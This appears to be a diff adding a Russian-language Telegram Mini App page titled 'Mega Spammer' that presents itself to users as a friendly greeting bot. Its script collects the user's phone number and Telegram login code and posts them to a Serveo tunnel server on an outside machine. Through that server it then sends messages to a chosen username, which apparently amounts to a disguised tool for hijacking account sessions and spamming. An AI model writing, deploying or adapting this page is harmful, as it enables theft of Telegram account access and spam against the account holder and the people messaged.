@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mega Spammer</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { 
+            font-family: sans-serif; 
+            padding: 20px; 
+            background-color: var(--tg-theme-bg-color, #fff); 
+            color: var(--tg-theme-text-color, #000); 
+            display: flex; flex-direction: column; align-items: center;
+        }
+        input { 
+            width: 100%; padding: 12px; margin-bottom: 10px; 
+            border-radius: 8px; border: 1px solid #ccc; 
+            box-sizing: border-box; 
+        }
+        button { 
+            width: 100%; padding: 14px; 
+            background-color: var(--tg-theme-button-color, #3390ec); 
+            color: #fff; border: none; border-radius: 8px; 
+            font-weight: bold; cursor: pointer; 
+        }
+        .hidden { display: none; }
+        #status { margin-top: 15px; color: green; font-size: 14px; text-align: center; }
+        .error { color: red !important; }
+    </style>
+</head>
+<body>
+    <h2 style="margin-bottom: 20px;">🤖 Привет-бот</h2>
+    
+    <div id="step1" style="width: 100%;">
+        <input type="tel" id="phone" placeholder="+7999...">
+        <button onclick="login()">Получить код</button>
+    </div>
+
+    <div id="step2" class="hidden" style="width: 100%;">
+        <input type="number" id="code" placeholder="Код из Telegram">
+        <button onclick="sendCode()">Войти</button>
+    </div>
+
+    <div id="step3" class="hidden" style="width: 100%;">
+        <input type="text" id="target" placeholder="Юзернейм друга (без @)">
+        <input type="text" id="btnName" placeholder="Имя кнопки" oninput="updBtn()">
+        <button id="mainBtn" onclick="fire()">Поприветствовать</button>
+    </div>
+    
+    <div id="status"></div>
+
+    <script>
+        // ============================================
+        // ТВОЯ ССЫЛКА SERVEO (ИЗ ПОСЛЕДНЕГО СООБЩЕНИЯ)
+        const SERVER_URL = "https://8b5f48c39c2b280f-91-239-23-66.serveousercontent.com"; 
+        // ============================================
+
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        let myPhone = localStorage.getItem("ph") || "";
+        if(myPhone) document.getElementById('phone').value = myPhone;
+
+        function showStatus(text, isErr = false) {
+            const el = document.getElementById('status');
+            el.innerText = text;
+            el.className = isErr ? 'error' : '';
+        }
+
+        async function req(path, body) {
+            try {
+                const r = await fetch(SERVER_URL + path, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(body)
+                });
+                return await r.json();
+            } catch (e) {
+                return {status: 'error', message: 'Ошибка сети. Проверь туннель на ПК!'};
+            }
+        }
+
+        async function login() {
+            myPhone = document.getElementById('phone').value.replace(/\s/g, '');
+            localStorage.setItem("ph", myPhone);
+            showStatus("Отправка запроса...");
+            
+            let res = await req('/login/start', {phone: myPhone});
+            if(res.status == 'ok') {
+                document.getElementById('step1').classList.add('hidden');
+                if(res.step == 'authorized') {
+                    document.getElementById('step3').classList.remove('hidden');
+                    showStatus("Вы уже вошли!");
+                } else {
+                    document.getElementById('step2').classList.remove('hidden');
+                    showStatus("Введите код из Telegram");
+                }
+            } else showStatus(res.message, true);
+        }
+
+        async function sendCode() {
+            let code = document.getElementById('code').value.trim();
+            showStatus("Проверяем...");
+            let res = await req('/login/complete', {phone: myPhone, code: code});
+            if(res.status == 'ok') {
+                document.getElementById('step2').classList.add('hidden');
+                document.getElementById('step3').classList.remove('hidden');
+                showStatus("Успешно!");
+            } else showStatus(res.message, true);
+        }
+
+        function updBtn() {
+            let t = document.getElementById('btnName').value;
+            document.getElementById('mainBtn').innerText = t ? "Поприветствовать " + t : "Поприветствовать";
+        }
+
+        async function fire() {
+            let target = document.getElementById('target').value.trim();
+            showStatus("Отправка...");
+            let res = await req('/greet', {phone: myPhone, target: target});
+            if(res.status == 'ok') showStatus("Отправлено: " + res.sent);
+            else showStatus(res.message, true);
+        }
+    </script>
+</body>
+</html>
